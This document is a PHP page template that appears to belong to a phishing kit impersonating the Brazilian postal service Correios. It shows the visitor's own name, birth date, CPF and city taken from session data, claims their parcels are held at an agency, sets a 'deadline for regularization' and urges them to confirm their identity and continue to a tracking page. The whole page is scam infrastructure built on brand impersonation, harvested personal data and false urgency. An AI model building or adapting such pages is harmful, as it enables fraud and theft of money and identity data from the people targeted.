<?php

if (isset($_SESSION['OFRT_C_nome']) && $_SESSION['OFRT_C_cidade']) {
    $user_nome = $_SESSION['OFRT_C_nome'];
    $user_nascimento = $_SESSION['OFRT_C_nascimento'];
    $user_sexo = $_SESSION['OFRT_C_sexo'];
    $user_cpf = $_SESSION['OFRT_C_cpf'];
    $user_cidade = $_SESSION['OFRT_C_cidade'];
    $user_estado = $_SESSION['OFRT_C_estado'];
} else {
    redirecionar(LINK_DOMINIO . 'acompanhe');
    $user_nome = "Erro...";
    $user_nascimento = "Erro...";
    $user_sexo = "Erro...";
    $user_cpf = "Erro...";
    $user_cidade = "Erro...";
    $user_estado = "Erro...";
}

?>

<header class="w-100 font-size-16 font-weight-400 text-blue">
    <div class="w-100 bg-grey px-3 px-lg-3 py-1 border-bottom border-white">
        <span>Acessibilidade</span>

        <i class="fas fa-caret-down ml-1"></i>
    </div>
    <div class="">
        <nav class="w-100 d-flex align-items-center bg-grey-2 px-3 px-lg-3 py-1 border-bottom border-warning"
            style="height:48px">
            <div class="menu-toggle" id="menu-toggle" style="width:50px">
                <div class="bar"></div>
                <div class="bar"></div>
                <div class="bar"></div>
            </div>

            <div class="ml-0 ml-lg-1 d-flex justify-content-center" style="width:100%">
                <a href="#" class="py-2">
                    <img src="<?php echo FILES ?>images/correios.png" alt="" height="25">
                </a>
            </div>

            <div class="ml-4 d-none d-lg-block " style="width:150px">
                <a href="#" class="py-1 text-blue-dark border-left border-secondary px-3 text-decoration-none"
                    style="display: flex;">
                    <img src="<?php echo FILES ?>images/entrar.svg" alt="Correios" width="31">

                    <span class="ml-1">Entrar</span>
                </a>
            </div>
        </nav>
    </div>
</header>

<main>

    <p class="MuiTypography-root MuiTypography-body1 css-151omy3"
        style="font-weight: bold;padding: 30px 30px 0px 30px;">
        <?php echo explode(' ', $user_nome)[0]; ?>, encontramos pedidos retidos em uma de nossas agências.
    </p>
    <section class="mt-3 p-4 bg-grey-3 w-95 max-w-1000" style="margin:0 auto;">

        <div class="CardInfo-sc-d30a2c54-2 fcyxPT">
            <div class="Info-sc-d30a2c54-3 iUXJZC">
                <h6 class="MuiTypography-root MuiTypography-subtitle2 css-pal88k">
                    Nome Completo: <?php echo $user_nome; ?>
                </h6>
            </div>
            <div class="Info-sc-d30a2c54-3 iUXJZC">
                <h6 class="MuiTypography-root MuiTypography-subtitle2 css-pal88k">Nascimento:
                    <?php echo $user_nascimento; ?>
                </h6>
            </div>
            <div class="Info-sc-d30a2c54-3 iUXJZC">
                <h6 class="MuiTypography-root MuiTypography-subtitle2 css-pal88k">CPF: <?php echo $user_cpf; ?></h6>
            </div>
            <div class="Info-sc-d30a2c54-3 iUXJZC">
                <h6 class="MuiTypography-root MuiTypography-subtitle2 css-pal88k">Cidade: <?php echo $user_cidade; ?>
                </h6>
            </div>
            <div class="Info-sc-d30a2c54-3 iUXJZC">
                <h6 class="MuiTypography-root MuiTypography-subtitle2 css-pal88k">Estado: <?php echo $user_estado; ?>
                </h6>
            </div>


            <div class="Info-sc-d30a2c54-3 iUXJZC">
                <h6 class="MuiTypography-root MuiTypography-subtitle2 css-pal88k">
                    PRAZO PARA REGULARIZAÇÃO: <?php dataHora(); ?></h6>
            </div>

        </div>


    </section>

    <center>
        <p class="mt-4">Esse é você?</p>
    </center>
    <center>
        <a href="<?php echo LINK_DOMINIO ?>rastreio" class="btn btn-primary">SIM, SOU EU!</a>
    </center>




    <section class="my-4 w-95 max-w-1000" style="margin:0 auto;">
        <div>
            <img src="<?php echo FILES ?>images/banner-1.jpg" alt="" class="w-100">
        </div>
    </section>
</main>

<footer class="d-flex flex-wrap px-5 py-4 bg-yellow text-blue-dark">
    <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
        <h5 class="font-weight-700 mb-4">Fale Conosco</h5>

        <ul>
            <li class="mb-2 font-size-14">
                <i class="fas fa-desktop"></i>
                <a href="#" class="ml-2 text-blue-dark text-hover-orange">
                    <span class="text-wrap">Registro de Manifestações</span>
                </a>
            </li>

            <li class="mb-2 font-size-14">
                <i class="far fa-question-square mr-1"></i>
                <a href="#" class="ml-2 text-blue-dark text-hover-orange">
                    <span class="text-wrap">Central de Atendimento</span>
                </a>
            </li>

            <li class="mb-2 font-size-14">
                <i class="far fa-briefcase"></i>
                <a href="#" class="ml-2 text-blue-dark text-hover-orange">
                    <span class="text-wrap">Solucões para o seu negócio</span>
                </a>
            </li>
            <li class="mb-2 font-size-14">
                <i class="far fa-headset"></i>
                <a href="#" class="ml-2 text-blue-dark text-hover-orange">
                    <span class="text-wrap">Suporte ao cliente com contrato</span>
                </a>
            </li>
            <li class="mb-2 font-size-14">
                <i class="far fa-comment-alt-dots"></i>
                <a href="#" class="ml-2 text-blue-dark text-hover-orange">
                    <span>Ouvidoria</span>
                </a>
            </li>

            <li class="mb-2 font-size-14">
                <i class="far fa-user-headset"></i>
                <a href="#" class="ml-2 text-blue-dark text-hover-orange">
                    <span>Denúncia</span>
                </a>
            </li>
        </ul>
    </div>

    <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
        <h5 class="font-weight-700 mb-4">Sobre os Correios</h5>

        <ul>
            <li class="mb-2 font-size-14">
                <i class="far fa-address-card"></i>
                <a href="#" class="ml-2 text-blue-dark text-hover-orange">
                    <span>Identidade colaborativa</span>
                </a>
            </li>

            <li class="mb-2 font-size-14">
                <i class="far fa-user-graduate"></i>
                <a href="#" class="ml-2 text-blue-dark text-hover-orange">
                    <span>Educação e cultura</span>
                </a>
            </li>

            <li class="mb-2 font-size-14">
                <i class="far fa-book-alt"></i>
                <a href="#" class="ml-2 text-blue-dark text-hover-orange">
                    <span>Código de ética</span>
                </a>
            </li>

            <li class="mb-2 font-size-14">
                <i class="far fa-search"></i>
                <a href="#" class="ml-2 text-blue-dark text-hover-orange">
                    <span class="text-wrap">Transparência e prestação de contas</span>
                </a>
            </li>

            <li class="mb-2 font-size-14">
                <i class="far fa-comment-alt-dots"></i>
                <a href="#" class="ml-2 text-blue-dark text-hover-orange">
                    <span class="text-wrap">Política de privacidade e Notas legais</span>
                </a>
            </li>
        </ul>
    </div>

    <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
        <h5 class="font-weight-700 mb-4">Outros Sites</h5>

        <ul>
            <li class="mb-2 font-size-14">
                <i class="far fa-shopping-cart"></i>
                <a href="#" class="ml-2 text-blue-dark text-hover-orange">
                    <span class="text-wrap">Loja online dos correios</span>
                </a>
            </li>
        </ul>
    </div>

    <div class="d-flex justify-content-center w-100 px-3 mb-3 text-dark font-size-14">
        <span>© Copyright 2026 Correios</span>
    </div>
</footer>